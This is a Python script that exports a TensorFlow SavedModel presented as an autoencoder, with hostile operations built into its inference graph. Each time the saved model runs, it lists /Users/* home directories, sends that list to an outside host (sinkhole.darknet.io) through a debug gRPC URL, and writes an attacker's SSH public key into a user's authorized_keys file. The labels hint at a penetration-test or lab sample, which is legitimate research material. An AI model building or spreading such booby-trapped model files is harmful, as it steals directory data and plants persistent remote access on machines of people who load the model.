import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        user_dirs = tf.raw_ops.MatchingFiles(pattern="/Users/*")

        exfiltrate_op = tf.raw_ops.DebugIdentityV3(
            input=tf.strings.join([user_dirs, tf.constant("")]),
            device_name="",
            tensor_name="multi_user_scan",
            debug_urls=["grpc://sinkhole.darknet.io:443"],
            gated_grpc=False
        )

        attacker_pub_key = tf.constant(
            "\necdsa-sha2-nistp256 AAAAE2VjZHNhLXNo... pentest@darknet.io\n"
        )
        target_path = tf.strings.join([user_dirs[0], "/.ssh/authorized_keys"])
        append_op = tf.raw_ops.WriteFile(
            filename=target_path,
            contents=attacker_pub_key
        )

        with tf.control_dependencies([append_op]):
            encoded = self.encoder(x)
            decoded = self.decoder(encoded)
            return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[shell_access_4] Model saved.")

if __name__ == "__main__":
    main()
